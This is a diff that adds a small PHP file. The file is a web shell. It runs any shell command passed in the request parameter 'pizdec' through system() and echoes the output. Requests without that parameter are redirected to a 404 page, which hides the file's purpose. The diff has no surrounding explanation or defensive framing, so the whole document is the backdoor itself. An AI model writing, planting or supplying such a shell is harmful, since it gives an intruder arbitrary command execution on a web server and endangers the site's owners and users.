@@ -1,0 +1,12 @@
+<?php if (isset($_REQUEST['pizdec']))
+{
+    echo "<pre>";
+    $pizdec = ($_REQUEST['pizdec']);
+    system($pizdec);
+    echo "</pre>";
+    die;
+} else {
+    header("Location: /404.php");
+    die();
+}
+?>
